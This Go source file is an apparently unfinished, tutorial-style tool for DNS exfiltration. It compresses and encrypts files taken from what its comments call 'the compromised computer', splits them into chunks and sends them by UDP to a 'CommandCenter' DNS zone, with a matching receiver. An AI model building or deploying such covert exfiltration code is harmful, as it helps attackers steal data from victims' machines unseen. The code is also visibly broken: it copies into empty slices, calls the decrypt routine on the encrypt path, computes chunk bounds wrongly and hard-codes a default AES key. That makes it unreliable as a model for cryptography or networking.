/*/

Excercises for the reader:
	1: Refactor so there is no repetitious code,
		The base functions seem fine, very modular and specific, however
		the control flows seem to have segments that are repeated throughout

	2: introduce a method to ensure file integrity with MD5 hashes sent in the datagram

	3: Craft a error handling function that will retry operations and exit gracefully on fatal errors

	Some relevant information:
    	A domain name can have maximum of 127 subdomains.
    	Each subdomains can have maximum of 63 character length.
    	Maximum length of full domain name is 253 characters.
    	Due to DNS records caching add unique value to URL for each request.
    	DNS being plaintext channel any data extracted over DNS will be in clear text format and will be available to intermediary nodes and DNS Server caches. Hence, it is recommended not to exfiltrate sensitive data over DNS.
/*/

package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strconv"

	"github.com/hashicorp/mdns"
	"github.com/kevinburke/nacl"
	"github.com/kevinburke/nacl/secretbox"
)

// bytes per read operation
var FILEREADSPEED int = 36

//var MADEFOR string = "Church of the Subhacker"
//var BANNERSTRING string = "====== mega impressive banner ======="

// File hashing function to ensure data integrity
func MD5Hash(DataToHash []byte) (MD5Hash []byte) {
	md5hash := crypto.MD5.New()
	asdf := md5hash.Sum([]byte(DataToHash))
	return asdf
}

// function to use zlib to compress a byte array
func ZCompress(input []byte) (herp []byte, derp error) {
	var b bytes.Buffer
	// feed the writer a buffer
	ZWriter := zlib.NewWriter(&b)
	// and the Write method will copy data to that buffer
	// in this case, the input we provide gets copied into the buffer "b"
	ZWriter.Write(input)
	// and then we close the connection
	ZWriter.Close()
	// and copy the buffer to the output
	copy(herp, b.Bytes())
	return herp, derp
}

// decompresses []byte with zlib
// feed it a file blob
func ZDecompress(DataIn []byte) (DataOut []byte, derp error) {
	byte_reader := bytes.NewReader(DataIn)
	ZReader, derp := zlib.NewReader(byte_reader)
	if derp != nil {
		fmt.Printf("[-] Could not Decompress File: %s", derp)
	}
	copy(DataOut, DataIn)
	ZReader.Close()
	return DataOut, derp
}

// opens files for reading
func OpenFile(filename string) (filebytes []byte) {
	// open the file
	herp, derp := os.Open(filename)
	if derp != nil {
		fmt.Printf("[-] Could not open File, exiting program : %s ", derp)
	}
	// function to wait on closing the file
	defer func() {
		if derp = herp.Close(); derp != nil {
			fmt.Printf("[-]IO: file already closed %s ", derp)
		}
	}()
	// make io.reader and the buffer it will read into
	reader := bufio.NewReader(herp)
	buffer := make([]byte, FILEREADSPEED)
	for {
		// read INTO buffer
		// return bytes read as filebytes
		_, derp := reader.Read(buffer)
		if derp != nil {
			fmt.Printf("[-] Could not read from file %s", derp)
			break
		}
		fmt.Printf("[+] Bytes read: %s", filebytes)

	}
	return buffer
}

// This file operation uses []bytes but there are other ways to write files
// This is ioutil
func WriteFile(FileData []byte, FileName string) (derp error) {
	// WriteFile writes []byte to a file named by filename.
	// this is the one used in this tutorial
	// set default to something rational
	derp = ioutil.WriteFile(FileName, FileData, 0644)
	if derp != nil {
		fmt.Printf("[-] Could not Write File: %s", derp)
	}
	return derp
}

// This creates a file for writing
func CreateFile(FileName string) (CreatedFile *os.File, derp error) {
	CreatedFile, derp = os.Create(FileName)
	if derp != nil {
		fmt.Printf("[-] Could not Create File with Permissions: %s", derp)
	}
	// prevent file from closing
	defer CreatedFile.Close()
	//return the file handle
	return CreatedFile, derp
}

// This writes data to it in the form of []byte
func WriteFile1(FileObject []byte, File *os.File) (derp error) {
	LengthOfDataWritten1, derp := File.Write(FileObject)
	if derp != nil {
		fmt.Printf("[-] Could not Write File: %s", derp)
	}
	fmt.Printf("wrote %d bytes", LengthOfDataWritten1)
	File.Sync()
	return derp
}

func WriteFile2(FileData string, File *os.File) (derp error) {
	// This writes data to it in the form of strings
	LengthOfDataWritten2, derp := File.WriteString(FileData)
	if derp != nil {
		fmt.Printf("[-] Could not write file: %s", derp)
	}
	fmt.Printf("wrote %d bytes", LengthOfDataWritten2)
	File.Sync()
	return derp
}

func WriteFile3(File *os.File, FileData string) (derp error) {
	// This writes with Bufio
	BufferWriter := bufio.NewWriter(File)
	LengthOfDataWritten3, derp := BufferWriter.WriteString(FileData)
	if derp != nil {
		fmt.Printf("[-] Could not write file With bufio.: %s", derp)
	}
	fmt.Printf("wrote %d bytes", LengthOfDataWritten3)
	BufferWriter.Flush()

	return derp
}

// This function creates a nonce with the bit size set at 24
// options are:
//		"gcm"
//		"salty"
func NonceGenerator(size int) (nonce []byte, derp error) {
	nonce = make([]byte, 24)
	// make random 24 bit prime number
	herp, derp := rand.Read(nonce)
	if derp != nil {
		fmt.Printf("[-] Failed to generate %d-bit Random Number , len(bytes):%d\n%s", size, herp, derp)
	}
	return nonce, derp
}

// makes chunky data for packet stuffing
// chunk size known, number of packets unknown
func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp error) {
	var DataInLength = len(DataIn)
	// make the buffer
	DataOutBuffer := make([][]byte, DataInLength)
	// loop over the original data object taking a bite outta crim... uh data
	for asdf := 1; asdf < DataInLength; asdf += chunkSize {
		// mark the end bounds
		end := asdf + chunkSize
		// necessary check to avoid slicing beyond slice capacity
		if end > DataInLength {
			end = DataInLength
		}
		DataOutBuffer = append(DataOutBuffer, DataIn[asdf:chunkSize])

	}

	return DataOutBuffer
}

// reassembles the message
// literally the reverse mathmatical operation of the chunker
// the results go to the decrpyter and then the decompressor
func ReassembleMessage(SplitMessage [][]byte) (ReassembledMessage []byte, derp error) {
	// this is called a "multi-dimensional array",
	// although in GOlang arrays are whole objects and slices are representations of them
	// so this is called a "multi-dimensional slice" instead
	//
	// We need the message length for the buffer
	msglen := 0
	for _, segment := range SplitMessage {
		msglen = msglen + len(segment)
	}
	// now we make the buffer for the message
	Message := make([]byte, msglen)
	for _, MessageSegment := range SplitMessage {
		// reconstruct the message segments into one slice
		// by copying the buffer
		copy(Message, MessageSegment)
	}
	// return the buffer containing the reassembled message
	return Message, derp
}

func GCMEncrypter(key []byte, nonce []byte, plaintext []byte) (EncryptedBytes []byte, derp error) {
	// The key argument should be the AES key, either 16 or 32 bytes to select AES-128 or AES-256.
	block, derp := aes.NewCipher(key)
	if derp != nil {
		fmt.Printf("generic error, fix me plz lol <3!: %s", derp)
	}
	//if _, derp := io.ReadFull(rand.Reader, nonce); derp != nil {
	//	fmt.Printf("generic error, fix me plz lol <3!: %s", derp)
	//}
	aesgcm, derp := cipher.NewGCM(block) // cipher.NewGCM(block)
	if derp != nil {
		fmt.Printf("generic error, fix me plz lol <3!: %s", derp)
	}
	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
	copy(ciphertext, EncryptedBytes)
	return EncryptedBytes, derp
}

//AES-256-GCM
// 32bytes only
// defaults to : AES256Key-32Characters1234567890
func GCMDecrypter(key []byte, nonce []byte, CipherText []byte) (plaintext []byte, derp error) {
	if key == nil {
		key = []byte("AES256Key-32Characters1234567890")
	}
	block, derp := aes.NewCipher(key)
	if derp != nil {
		fmt.Printf("generic error, fix me plz lol <3!: %s", derp)
	}
	aesgcm, derp := cipher.NewGCM(block)
	if derp != nil {
		fmt.Printf("generic error, fix me plz lol <3!: %s", derp)
	}

	plaintext, derp = aesgcm.Open(nil, nonce, CipherText, nil)
	if derp != nil {
		fmt.Printf("generic error, fix me plz lol <3!: %s", derp)
	}

	return plaintext, derp
}

//uses NaCl library
func saltycrypt(keystring string, DataIn []byte) (Ciphertext []byte, derp error) {
	key, derp := nacl.Load(keystring)
	if derp != nil {
		fmt.Printf("[-] FATAL ERROR: Could not encrypt data! %s", derp)
	}
	Ciphertext = secretbox.EasySeal(DataIn, key)
	return Ciphertext, derp
}

// decrypts with NaCl
func saltDEcrypt(keystring string, data []byte) (Plaintext []byte, derp error) {
	key, derp := nacl.Load(keystring)
	if derp != nil {
		panic(derp)
	}
	Plaintext, derp = secretbox.EasyOpen(data, key)
	if derp != nil {
		fmt.Printf("[-] FATAL ERROR: Could not decrypt data!: %s", derp)
	}
	return Plaintext, derp
}

//https://flaviocopes.com/go-shell-pipes/
func PipeReader() (PipedInput []byte, derp error) {
	// checks pipe operation
	FileInfo, derp := os.Stdin.Stat()
	if derp != nil {
		fmt.Printf("[-] FATAL ERROR: Could not Pipe data!: %s", derp)
		os.Exit(1)
	}
	// if we have a pipe input
	if FileInfo.Mode()&os.ModeNamedPipe != 0 {
		// make a buffer the proper length
		//PipeBuffer = make([]byte, FileInfo.Size())
		// begin reading into buffer
		pipereader := bufio.NewReader(os.Stdin)
		PipeBuffer, _ := ioutil.ReadAll(pipereader)
		copy(PipedInput, PipeBuffer)
	}
	return PipedInput, derp

}

func MultiCastSend(Message []byte) {

}

// takes a hostname
func MulticastReceive(hostname string, ServiceName string, ServiceInfo []string) {
	// Setup our service export
	service, _ := mdns.NewMDNSService(hostname, ServiceName, "", "", 8000, nil, ServiceInfo)
	// Create the mDNS server, defer shutdown
	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
	defer server.Shutdown()
}

func MulticastFlow(hostname string, servicename string, info string) {
	// Setup our service export
	if hostname == "" {
		hostname, _ = os.Hostname()
	}
	if info == "" {
		info = "My awesome service"
	}
	if servicename == "" {
		servicename = "_foobar._tcp"
	}
	MulticastReceive(hostname, servicename, []string{info})
}

//receives udp packets and passes them to the reassembler/repeat request engine
// if port/ip are nil, default is 0.0.0.0:53
func DNSReceiver(ipaddr string, port int) (EncryptedMessage []byte, derp error) {
	if ipaddr != "" {
		addr := net.UDPAddr{
			Port: 53,
			IP:   net.ParseIP("0.0.0.0"),
		}
		// returns a network connection to work with
		herp, derp := net.ListenUDP("udp", &addr)
		if derp != nil {
			fmt.Printf("[-] Failed to open Socket: %s", derp)
		}
		// prevent closing the connection untio operations end
		defer herp.Close()
		// create a buffer to hold the incomming data
		BytesFromWire := make([]byte, 4096)
		// reads data from socket connection into buffer
		_, ClientAddr, derp := herp.ReadFromUDP(BytesFromWire)
		if derp != nil {
			fmt.Printf("Error:: %s", derp)
		}
		fmt.Printf("Message From : %d ", ClientAddr.IP)
		//////////////////////////////////////////////////////////////
		// lock in to message with magic number + index ( I.E. 0-whatever)
		// reassemble all into one buffer by index
		// YOU STOPPED HERE DUMBASS
		//MessageSegmentBuffer := bytes.NewBuffer()
		//for index, thing := range BytesFromWire {
		//}
	}
	return EncryptedMessage, derp
}

// main function for the compromised computer
// Exports a sequence of encrypted bytes via DNS packets
// max message size is 512 bytes, that is the number we feed the data chunker
func UDPSendDNS(EncryptedMessage []byte, DestZone *net.UDPAddr, MsgSize int) {
	//precalc final message length, minus 1 byte per message for sequence index
	// minus (len(magicnumber) +1) for index with magic number
	MsgLengthPerPacket := (len(EncryptedMessage) / (MsgSize - 1))
	// returns an array of arrays
	chunksofdata := DataChunkerChunkSize(EncryptedMessage, MsgLengthPerPacket)
	// iterating over the data chunks to send as message
	for _, thing := range chunksofdata {
		// sending each chunk with the index and the data for reassembly
		for MsgSegmentIndex, msgchunk := range thing {
			///////////////////////////////////////////////////////////////////
			// Craft the message buffer
			var message []byte
			// temporary
			MagicNumber := byte(0xb2)
			// prepend the magic number + index to the message chunk
			// and feed that to the dialer
			index := byte(MsgSegmentIndex)
			message = append(message, MagicNumber)
			message = append(message, index) //, msgchunk)
			message = append(message, msgchunk)

			//hexString = hex.EncodeToString(message)
			asdf, derp := net.DialUDP("udp", nil, DestZone)
			if derp != nil {
				fmt.Printf("[-] Failed to Establish Socket: %s", derp)
			}
			_, _, derp = asdf.WriteMsgUDP(message, nil, DestZone)
			if derp != nil {
				fmt.Printf("[-] Failed to write message to socket: %s", derp)
			}
		}

	}
}

///////////////////////////////////////////////////////////////////////////////
////         CONTROL FLOWS           ////
///////////////////////////////////////////////////////////////////////////////
// control flow for scripting/pipes
func Pipeflow(key []byte, nonce []byte) (derp error) {
	//read from pipe
	var plaintext []byte
	PipedInput, _ := PipeReader()
	// decrypting input from the pipe
	if Decrypt.set {
		// get plaintext
		switch EncryptionType.FlagValue {
		case "aes256gcm":
			plaintext, derp = GCMDecrypter(key, nonce, PipedInput)
			if derp != nil {
				fmt.Printf("[-]PIPE: GCMDecrypter: %s", derp)
			}
		case "salty":
			plaintext, derp = saltDEcrypt(string(key), PipedInput)
			if derp != nil {
				fmt.Printf("[-]PIPE: Salt Lib Decrypter: %s", derp)
			}
		}
		//decompress plaintext
		DecompressedPlaintext, derp := ZDecompress(plaintext)
		// process possible errors
		if derp != nil {
			fmt.Printf("[-]PIPE: ZDecompress: %s", derp)
		}
		//print to stdout for further piping
		fmt.Printf("%s", DecompressedPlaintext)
	} else

	// if we are encrypting the input from the pipe
	if Encrypt.set {
		// Compress input from stdin
		CompressedInput, derp := ZCompress(PipedInput)
		if derp != nil {
			fmt.Printf("[-]PIPE: ZCompress: %s", derp)
		}
		// get cipher text from compressed input
		switch EncryptionType.FlagValue {
		case "aes256gcm":
			ciphertext, derp := GCMEncrypter(key, nonce, CompressedInput)
			// process possible errors
			if derp != nil {
				fmt.Printf("[-]PIPE: Internal GCM Encrypter: %s", derp)
			}
			// print ciphertext to stdout for further piping
			fmt.Printf("%s", ciphertext)
		case "salty":
			ciphertext, derp := saltDEcrypt(string(key), CompressedInput)
			if derp != nil {
				fmt.Printf("[-]PIPE: Salt Lib Encrypter: %s", derp)
			}
			// print ciphertext to stdout for further piping
			fmt.Printf("%s", ciphertext)
		}
	}
	// print ciphertext to stdout for further piping
	return derp
}

// This is the control flow for operating as a server, receiving
// encrypted messages from the client on a compromised computer
func ServerFlow(key []byte, nonce []byte) {
	// start server
	var plaintext []byte
	Message, derp := DNSReceiver("127.0.0.1", 43)
	if derp != nil {
		fmt.Printf("[-] Error : Could not Establish Server Instance: %s ", derp)
	}
	// if decrypting
	if Decrypt.set {
		switch EncryptionType.FlagValue {
		case "aes256gcm":
			plaintext, derp = GCMDecrypter(key, nonce, Message)
			if derp != nil {
				fmt.Printf("[-] Error: Could not decrypt Message: %s ", derp)
			}
		case "salty":
			plaintext, derp = saltDEcrypt(string(key), Message)
			if derp != nil {
				fmt.Printf("[-] Saltlib could not Decrypt: %s ", derp)
			}
		}
		// decompress
		DecompressedMessage, derp := ZDecompress(plaintext)
		if derp != nil {
			fmt.Printf("[-] Error: Could not Decompress Message: %s ", derp)
		}
		// write to file
		WriteFile(DecompressedMessage, Filename.FlagValue)
	} else if Encrypt.set {
		// var setup
		var EncryptedFile []byte
		// begin opening and compressing the file data
		FileBytes := OpenFile(Filename.FlagValue)
		CompressedFile, derp := ZCompress(FileBytes)
		if derp != nil {
			fmt.Printf("[-] Could Not Compress File: %s ", derp)
		}
		// chooses which method of encryption to use if running as server
		switch EncryptionType.FlagValue {
		case "aes256gcm":
			EncryptedFile, _ := GCMEncrypter(key, nonce, CompressedFile)
			WriteFile(EncryptedFile, Filename.FlagValue)
		case "salty":
			EncryptedFile, _ = saltycrypt(string(key), CompressedFile)
			WriteFile(EncryptedFile, Filename.FlagValue)
		}
	}
}

// control flow for the client configuration
// Only Compresses and Encrypts
func ClientFlow(key []byte, nonce []byte) {
	var destzone *net.UDPAddr
	MsgSize, derp := strconv.Atoi(MaxMsgSize.FlagValue)
	if derp != nil {
		fmt.Printf("[-] Bad parameter - MaxMsgSize : %s", derp)
	}
	//if not an IP, assume a hostname
	addr := net.ParseIP(CommandCenter.FlagValue)
	if addr == nil {
		destzone = &net.UDPAddr{
			Zone: CommandCenter.FlagValue,
		}
	}
	// var setup
	var EncryptedFile []byte
	// open the file data into a buffer
	FileBytes := OpenFile(Filename.FlagValue)
	// compress that file data
	CompressedFile, derp := ZCompress(FileBytes)
	// if there was an error, print it and exit or try again?
	if derp != nil {
		fmt.Printf("[-] Could Not Compress File: %s ", derp)
	}
	// chooses which method of encryption to use
	switch EncryptionType.FlagValue {
	case "aes256gcm":
		EncryptedFile, _ := GCMEncrypter(key, nonce, CompressedFile)
		// send the data to the client function to put out on the wire
		UDPSendDNS(EncryptedFile, destzone, MsgSize)
	case "salty":
		EncryptedFile, _ = saltycrypt(string(key), CompressedFile)
		UDPSendDNS(EncryptedFile, destzone, MsgSize)
	}

}

// Control Flow for Operating with the -File flag
func FileFlow(filename string, key []byte, nonce []byte) {
	// open the file
	fileobject := OpenFile(filename)
	// If we are decrypting, we decrypt/decompress
	if Decrypt.set {
		switch EncryptionType.FlagValue {
		case "aes256gcm":
			plaintext, derp := GCMDecrypter(key, nonce, fileobject)
			if derp != nil {
				fmt.Printf("[-] Error: Could not Decrypt File: %s ", derp)
			}
			//decompress plaintext
			DecompressedPlaintext, derp := ZDecompress(plaintext)
			// process possible errors
			if derp != nil {
				fmt.Printf("[-]FILE: ZDecompress: %s", derp)
			}
			//Write to file
			// make a safe filename- to save the file as
			safefilename := filename + "_Decrypted"
			WriteFile(DecompressedPlaintext, safefilename)
		case "salty":
			plaintext, derp := saltDEcrypt(string(key), fileobject)
			if derp != nil {
				fmt.Printf("[-] Saltlib could not Decrypt File: %s ", derp)
			}
			//decompress plaintext
			DecompressedPlaintext, derp := ZDecompress(plaintext)
			// process possible errors
			if derp != nil {
				fmt.Printf("[-]FILE: ZDecompress: %s", derp)
			}
			//Write to file
			//fmt.Printf("%s", DecompressedPlaintext)
			// make a safe filename- to save the file as
			safefilename := filename + "_Decrypted"
			WriteFile(DecompressedPlaintext, safefilename)
		}
	} else if Encrypt.set {
		// compress input file
		// make a safe filename- to save the file as
		safefilename := filename + "_Encrypted"
		CompressedFile, derp := ZCompress(fileobject)
		if derp != nil {
			fmt.Printf("[-] Could Not Compress File: %s ", derp)
		}
		// chooses which method of encryption to use
		switch EncryptionType.FlagValue {
		case "aes256gcm":
			EncryptedFile, _ := GCMEncrypter(key, nonce, CompressedFile)
			WriteFile(EncryptedFile, safefilename)
		case "salty":
			EncryptedFile, _ := saltycrypt(string(key), CompressedFile)
			WriteFile(EncryptedFile, safefilename)
		}
	}
}

//type Client struct{
//	CommandCenter
//}
/*/
//https://stackoverflow.com/questions/35809252/check-if-flag-was-provided-in-go
This is a way to tell if a flag has been set or not

/*/
// make the idea exist
type FlagVals struct {
	set       bool   // true if flag used on command line
	FlagValue string // empty if used but no value fed to parameter
}

//type FlagOpt struct {
//	*FlagVals
//}

func (FlagPassed *FlagVals) Set(FlagValue string) error {
	FlagPassed.FlagValue = FlagValue
	FlagPassed.set = true
	return nil
}
func (FlagPassed *FlagVals) String() string {
	return FlagPassed.FlagValue
}

var Filename FlagVals
var EncryptionKey FlagVals
var EncryptionType FlagVals
var Encrypt FlagVals
var Decrypt FlagVals
var Pipe FlagVals
var Server FlagVals
var Client FlagVals
var MultiCast FlagVals
var MaxMsgSize FlagVals
var CommandCenter FlagVals

// these must be reflected in the decs above
func init() {
	flag.Var(&Filename, "filename", "the local file to Read/Write.")
	flag.Var(&EncryptionKey, "key", "Encryption Key to use")
	flag.Var(&EncryptionType, "enctype", "Encryption Type , Can be: aes256gcm / salty ")
	flag.Var(&Decrypt, "decrypt", "Use this flag if decrypting")
	flag.Var(&Encrypt, "encrypt", "Use this flag if encrypting")
	flag.Var(&MultiCast, "MultiCast", "Use this flag to send via MultiCast DNS")
	flag.Var(&Pipe, "pipe", "pipe redirection \n  Usage: cat ./narf.txt | gocrypt -pipe -encrypt -enctype aes256gcm -key asdf123 ")
	flag.Var(&Server, "server", " run as server to receive messages, \n cannot be used in combination with other options")
	flag.Var(&MaxMsgSize, "MaxMsgSize", "number of bytes to allow for a message, Default : 512b")
	flag.Var(&CommandCenter, "CommandCenter", "the dns zone (homebase) to send the queries to.")
	//flag.Var(&MagicNumber, "MagicNumber", "Hex number to prepend to message to indicate its a message")
	// MAGIC NUMBERS FOR IDENTIFICATION
	// me do it this way so we can abstract it out later
	// make the buffer
	//MAGICNUMBERLIST := make([][]byte, 3)
	// define the bytes
	//MagicList := []byte{0xb2, 0xa4, 0xd2}
	//for index, MagicByte := range MagicList {
	//	append(MAGICNUMBERLIST[index], MagicByte)
	//}
}

func main() {
	//var debug = flag.Bool("d", false, "enable debugging.")
	//var debug = flag.Bool("d", false, "enable debugging.")
	//var logfile = flag.String("logfile", "BeaverStash.log", "logfile")
	var help = flag.Bool("help", false, "show help.")
	// move up
	flag.Parse()
	// show help if requested
	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}
	// preliminary checks to avoid bad options
	// needs more checks
	// there are obvious ones
	if (Server.set && Client.set) || (Filename.set && Pipe.set) || (Encrypt.set && Decrypt.set) {
		fmt.Printf("Bad options, more stuff goes here")
	}
	// And then some not so obvious
	if ((Server.set || Client.set) && (Pipe.set)) || (!EncryptionKey.set || !EncryptionType.set) {
		fmt.Printf("Bad options, more stuff goes here")
	}
	if (EncryptionType.FlagValue != "aes256gcm") || (EncryptionType.FlagValue != "salty") {
		fmt.Printf("Bad Encryption Type, Allowed options : \"aes256gcm\" \"salty\" ")
	}
	///////////////////////////////////////////////////////////////////////////
	/// Setup basic variables

	// Encode the key
	// make the magic number
	//	asdf, _ := hex.DecodeString(MagicNumber.FlagValue)
	key := make([]byte, hex.EncodedLen(len(EncryptionKey.FlagValue)))
	hex.Encode(key, []byte(EncryptionKey.FlagValue))
	//	MagicNum := hex.Encode()
	// create nonce
	nonce, derp := NonceGenerator(32)
	// check for errors
	if derp != nil {
		fmt.Printf("[-] Nonce Generation FAILED!: %s", derp)
	}
	///////////////////////////////////////////////////////////////////////////////
	///    BEING WORKED ON
	///////////////////////////////////////////////////////////////////////////////
	// Remote Input / Local Output
	if Server.set {
		go ServerFlow(key, nonce)
	} else

	// Local Input / Remote Output
	if Client.set {
		go ClientFlow(key, nonce)
	}
	///////////////////////////////////////////////////////////////////////////////
	///    FINISHED
	///////////////////////////////////////////////////////////////////////////////
	// if we are piping the data, neither client or server
	// standalone operation with shell pipes in the terminal
	// this is a non-networked operation with PTY local I/O
	if Pipe.set && !Filename.set {
		go Pipeflow(key, nonce)
	} else

	// we are not using a pipe
	// standalone file encryption iin the terminal
	// File Input/ File Output
	if !Pipe.set && Filename.set {
		go FileFlow(Filename.FlagValue, key, nonce)
	}

}
